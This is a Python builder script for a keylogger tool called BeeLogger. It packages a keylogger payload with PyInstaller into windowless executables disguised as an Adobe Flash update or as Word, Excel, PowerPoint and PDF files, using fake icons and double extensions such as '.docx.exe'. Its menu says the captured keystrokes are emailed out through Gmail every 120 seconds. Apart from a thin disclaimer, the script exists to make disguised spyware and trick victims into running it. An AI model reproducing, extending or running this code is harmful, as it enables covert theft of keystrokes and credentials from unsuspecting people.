# Written by: Hackpy3
# https://github.com/Hackpy3/keylogger
# Licensed under the MIT
import os
import sys
import time

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\033[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

if not os.geteuid() == 0:
    sys.exit('BeeLogger must be run as root')

def clear():
    os.system('clear')

def begin():
    os.system('sudo rm -Rf dist')

def install_pyinstaller():
    os.system('python3 -m pip install pyinstaller')

def warn():
    sys.stdout.write(YELLOW + r'''
    Not Responsible For Misuse or Illegal Purposes.
    Use it just for WORK or EDUCATIONAL purposes!
''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  '''
''' + WHITE + '''   Not Responsible For Misuse ''' + YELLOW + '''
''' + WHITE + '''      or Illegal Purposes.''' + YELLOW + '''
''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
''')

def heading():
    os.system('clear')
    sys.stdout.write(YELLOW + r'''
                .' '. I BEE YOU  __
       .        .   .          \(__\_/             Version: 3
        .         .         . -{{#(|8)
          ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Hackpy3 (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END)
    print(' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n')

def pp():
    sys.stdout.write(GREEN + 'Thank You for using Bee, Think Great, Fly High!  \n' + END)

def option():
    print(' {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' +
          ' {0}[{1}2{0}]{1} Fake Word docx '.format(BLUE, WHITE) + '\n' +
          ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' +
          ' {0}[{1}4{0}]{1} Fake Powerpoint pptx '.format(BLUE, WHITE) + '\n' +
          ' {0}[{1}5{0}]{1} Fake Acrobat pdf '.format(BLUE, WHITE) + '\n' +
          ' {0}[{1}6{0}]{1} Blank Executable '.format(BLUE, WHITE))

def main():
    clear()
    install_pyinstaller()
    warn()
    input('\nPRESS [ENTER] TO CONTINUE')
    clear()
    heading()
    try:
        while True:
            header = ('{0}Bee{1} > {2}'.format(YELLOW, WHITE, END))
            choice = input(header)
            if choice.upper() in ['Q', 'QUIT']:
                clear()
                pp()
                raise SystemExit
            if choice.upper() == 'K':
                option()
                print('\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END))
                print('\n NOTE: Don\'t use your personal email, make a dedicated.')
                print('\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END))
            if choice.upper() == '6':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        os.system('sudo rm -Rf Templates/k_enc.py')
                        print('\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            if choice == '1':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee_Flash_.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            elif choice == '2':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee_Word_.docx.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            elif choice == '3':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee_Excel_.xlsx.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            elif choice == '4':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee_Power_.pptx.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            elif choice == '5':
                begin()
                if os.path.exists('k.py'):
                    print(f"Current working directory: {os.getcwd()}")
                    print(f"k.py exists: {os.path.exists('k.py')}")
                    os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
                    if os.path.exists('dist/k.exe'):
                        os.system('rm -Rf build k.spec k.py')
                        name = 'Bee_AcrobatPDF_.pdf.exe'
                        os.rename('dist/k.exe', 'dist/' + name)
                        clear()
                        heading()
                        print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
                    else:
                        print(RED + 'Error: dist/k.exe not found. Please check the pyinstaller command.' + END)
                else:
                    print(RED + 'Error: k.py does not exist in the current directory.' + END)
            if choice.upper() == 'U' or choice.upper() == 'UPDATE':
                os.system('python3 updater.py')
            if choice.upper() == 'EXIT' or choice.upper() == 'CLOSE':
                clear()
                pp()
                raise SystemExit
    except KeyboardInterrupt:
        clear()
        pp()
        sys.exit(0)

if __name__ == '__main__':
    main()
